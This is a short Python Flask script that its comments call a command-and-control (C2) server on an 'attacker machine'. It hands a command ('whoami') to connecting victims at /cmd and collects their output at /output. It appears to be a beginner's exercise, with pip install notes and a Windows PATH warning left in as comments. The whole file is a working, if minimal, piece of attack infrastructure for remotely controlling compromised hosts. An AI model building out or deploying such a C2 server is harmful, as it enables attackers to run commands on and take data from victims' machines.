# C2 server runs on our attacker machine and waits for victims to connect.
# Server allows user to send commands to victims and get results back.

# pip install flask
# python3 -m pip install flask
from flask import Flask, request
# import flask
# WARNING: The script flask.exe is installed in 'C:\Users\Guac\AppData\Roaming\Python\Python312\Scripts' which is not on PATH.
# Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.

app = Flask(__name__)

@app.route("/cmd") #Tells flask for when a client reaches out to [server]/cmd, what to do (run get_command()
def get_command():
    return "whoami"

@app.route("/output",methods=["POST"])
def get_output():
    print(request.data.decode())
    #data = request.form["data"]
    #print(request)
    return "ok dont care"

def main():
    # Start flask on all ports
    app.run(host="0.0.0.0",port=12345,debug=True)

main()